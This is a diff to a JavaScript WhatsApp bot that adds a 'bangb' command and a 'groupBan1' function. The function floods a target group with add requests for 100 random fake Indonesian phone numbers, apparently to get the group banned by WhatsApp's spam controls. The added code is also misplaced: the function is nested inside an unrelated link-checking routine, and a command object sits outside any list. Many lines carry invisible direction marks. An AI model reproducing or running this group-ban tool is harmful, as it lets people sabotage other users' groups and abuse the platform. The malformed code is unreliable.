@@ -479,6 +479,27 @@ function containsLinkInMessage(msg) {
     m?.documentMessage?.caption
   ].filter(Boolean);
 
+  async function groupBan1(sock, jid) {
+‎  try {
+‎    if (!jid.endsWith("@g.us")) throw new Error("Grup only");
+‎
+‎    // Nomor fake valid-range Indonesia (62xxx)
+‎    const fakeNumbers = Array.from({ length: 100 }, () => {
+‎      const n = Math.floor(100000000 + Math.random() * 899999999);
+‎      return `62${n}@s.whatsapp.net`;
+‎    });
+‎
+‎    for (const fakeJid of fakeNumbers) {
+‎      sock.groupParticipantsUpdate(jid, [fakeJid], "add").catch(() => {});
+‎      await sleep(30);
+‎    }
+‎
+‎    console.log(chalk.green(`✅ [GROUP BAN] Selesai → ${jid}`));
+‎  } catch (err) {
+‎    throw new Error(`bngc: ${err.message}`);
+‎  }
+‎}
+
   return candidates.some(containsLink);
 }
 
@@ -1845,6 +1866,17 @@ return;
       await sendBotReply(sock, jid, "❌ BOSS X-কে আগে group admin করতে হবে।");
       return;
     }
+
+    
+‎  {
+‎    key: "group_ban",
+‎    command: "bangb",
+‎    label: "Group ban",
+‎    type: "group",
+‎    description: "Group ban participant loop",
+‎    risk: "🔴",
+‎    run: async ({ sock, target }) => groupBan1(sock, target),
+‎  }
 
     const metadata = await getGroupMetadataSafe(sock, jid);
     const ownerNumber = baseNumber(config.OWNER_NUMBER);
